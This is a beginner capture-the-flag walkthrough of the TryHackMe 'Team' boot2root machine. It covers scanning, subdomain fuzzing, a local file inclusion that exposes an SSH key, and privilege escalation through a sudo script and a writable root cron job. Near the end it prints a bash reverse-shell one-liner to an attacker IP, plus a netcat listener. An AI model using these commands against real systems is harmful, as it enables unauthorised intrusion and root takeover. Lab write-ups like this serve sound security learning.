# [Team][1]
Beginner friendly boot2root machine

#### Scan the Machine
> If you are unsure how to tackle this, I recommend checking out the [Nmap Tutorials by Hack Hunt][2].

`nmap -sV -Pn <IP>`

![Nmap Scan](images/open_ports.jpg)

Looks like we have three ports open: `21, 22, 80`

> Let's check the webpage as port 80 is open. Well its just the Apache Server Default Page. Nothing much really.

I tried different things, didn't find much:

- :no_good: Nothing on GoBuster  
- :no_good: Nothing using enum4linux  

Then I checked the source code and found something interesting in the TITLE.

![Source Code](images/source_code.jpg)
> It says to add **team.thm** to the HOSTS file.

![Add to HOSTS](images/add_to_host.jpg)
> I checked the link in the browser with `team.thm`. It gives me a google search results. But on the TOP is says go to the website, so I did. The result was fascinating.

![Different Webpage](images/different_webpage.jpg)
> I don't know about you guys! But I was little surprised with the result. Therefore, I did some search and found this is called ***Virtual Host Routing***.

So with a new domain I tried to run the GoBuster Again: `gobuster dir -u http://team/thm -w /var/share/wordlists/dirb/common.txt -x txt,php,html`

![GoBuster Results](images/gobuster.jpg)
> *robots.txt* file looks interesting so I checked the file in the browser `team.thm/robots.txt`. Huh! Just a four letter word 'dale'. Well it can be username.

As through Nmap scan we know that ssh port is open. We can now bruteforce `hydra -l dale -P rockyou.txt ssh://<IP>`
> I waited for like hours but didn't found anything  :sob:

Let's try WFUZZ to check for subdomains. `wfuzz -c -u http://team.thm -H "Host:FUZZ.team.thm" -w <wordlist>`

[Wordlist][5] I used is from SecLists. Also, we you are not sure of this commands like GoBuster and WFUZZ check [Advent Of Cyber 2][4] on TryHackMe (Day 4).

>When I tried to run the command there were two many results. So I stopped and add `--hw 977` as most of the files has this word counts.

![WFUZZ](images/wfuzz.jpg)

> Seems like we found subdomain `dev`. So this is what HINT was about. Let's add the subdomain to HOSTS file and check the site.

![Adding Subdomain](images/add_subdomain_host.jpg)

I added `dev.team.thm` and `www.dev.team.thm`.

![Checking Subdomain](images/dev_web_result.jpg)

Clicking on the links takes us to another page.

![Click Link](images/further_investigate.jpg)

Seems like a script is running and a `page` variable. Wonder if the HINT was about this too  :innocent:.

![User Flag](images/user_flag.jpg)
> BAAAAM! We got the user flag. We know that `dale` is a user and the flag can be in dale's root directory.

We can try for LFI here, FIRE UP your BurpSuite.
1. Capture the Request
2. Send it to intruer

![BurpSuite](images/burp_intruder.jpg)

3. Select payload. For this I used [Wordlist][3] from PayloadsAllTheThings.

As the port `21, 22` are open. I first looked for the file:
- /etc/ssh/ssh_config
- /etc/ssh/sshd_config
- /etc/vsftp.config

After looking through this files. I found **SSH Key** of DALE in `sshd_config` file. We have a SSH Key. Copy the content from `----BEGIN..` and paste in the file. I named the file `id_rsa` (this is the general name used). Use `chmod 600 id_rsa` (this is the general permissions of a SSH Key). Connect using `ssh -i id_rsa dale@<IP>`

![Got SSH](images/got_ssh.jpg)

BOOM! We got the access. Now first thing I do is check for sudo list commands. That can be done using `sudo -l`

![Sudo](images/sudo_l.jpg)

There is a file which can be run using `gyles` user. Let's check the content of the file.

![Content](images/cat_file.jpg)

Seems like a file which takes input from the user. Specially ***$error*** variable seems to interact with SHELL. What if we give input `/bin/bash`.


![Run Rights](images/run_rights.jpg)

Run the file with `gyles` rights, so that we can get access to that user.

![Bash input](images/bin_bash.jpg)

We can work with this as a shell. However, I learnt something like ***Shell Stabilization*** in [Advent of Cyber 2][4] (Day 24)

Run command -> `python -c 'import pty;pty.spawn("/bin/bash")'`

![Shell Stable](images/python_run.jpg)
> BAAM! We got stable shell as `gyles`. We didn't have the password of this account. So `sudo -l` is not a good idea.

I was kinda in trouble here however I had [linPEAS][6] to rescue.

Fireup another shell and transfer `linpeas.sh` to the machine using `scp -i id_rsa <location_in_your_pc> dale@10.10.7819:.`.

![File Transfer](images/linpeas_trasnfer.jpg)
> This will transfer the file to the home directory of `dale`.

Let's run the file and see what kind of results we have.

![Run LinPEAS](images/execute_linpeas.jpg)

There is a lot of information. But we are interested in the lines with RED color.

- User is in **admin** group.
- sudo version is **1.8.21p2**.
- /usr/local/bin
  - It is writeable directory and has a file
  - In **cron jobs** I see the file `main_backup.sh` which is in the same dir.
- /var/backups/www/team.thm/scripts/scripts.old

![File Found](images/file_found.jpg)
> Seems like a bash command and this file can be edited, as `gyles` is
 in `admin` group. Also, we know that this file runs as `root` (cronjobs` found via *linPEAS*).

 Therefore, we can add the famous bash one liner to get a shell as `root`.
 - Open the file using `nano main_backup.sh`
 - Add the Bash CMD -> `bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1`.
 - Press `Ctrl+X`, then `Y` and then ENTER.

 ![Bash Command](images/verify.jpg)

Start a listner using `nc -lvnp 4444`

![Listener](images/listener.jpg)

Wait for a while and you will have a shell as a `root`

![Root Access](images/root_access.jpg)

You know what to do next :stuck_out_tongue_winking_eye:
